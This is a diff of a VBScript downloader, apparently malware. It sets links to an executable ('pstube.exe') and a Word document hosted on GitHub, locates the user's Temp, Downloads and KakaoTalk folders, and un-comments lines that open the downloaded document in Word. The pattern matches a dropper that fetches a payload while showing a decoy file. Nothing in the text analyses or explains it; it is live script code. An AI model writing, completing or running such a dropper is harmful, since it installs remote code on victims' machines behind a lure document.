@@ -1,10 +1,9 @@
 Set WshShell = CreateObject("Wscript.Shell")
 
-TempPath = WshShell.ExpandEnvironmentStrings("%localappdata%\Temp")
-
 strLink1 = "https://github.com/choitaewon649/save/raw/main/pstube.exe"
 strLink2 = "https://github.com/choitaewon649/save/raw/main/1235.docx"
 
+TempPath = WshShell.ExpandEnvironmentStrings("%localappdata%\Temp")
 DownloadPath = WshShell.ExpandEnvironmentStrings("%userprofile%") & "\Downloads"
 KatalkPath = WshShell.ExpandEnvironmentStrings("%localappdata%\Kakao\KakaoTalk")
 
@@ -98,11 +97,11 @@ If objFSO.FileExists(strSaveTo2) = 0 Then
     'WScript.Echo "Download `" & strSaveName2 & "` completed successfuly."
    'End If 
 
-  'Dim quote, pgms
+  Dim quote, pgms
 
-  'set shell = WScript.CreateObject("WScript.Shell")
-  'quote = Chr(34)
-  'pgm = "WINWORD"
-  'WshShell.Run quote & pgm & quote & " " & strSaveTo2
+  set shell = WScript.CreateObject("WScript.Shell")
+  quote = Chr(34)
+  pgm = "WINWORD"
+  WshShell.Run quote & pgm & quote & " " & strSaveTo2
 
 End If
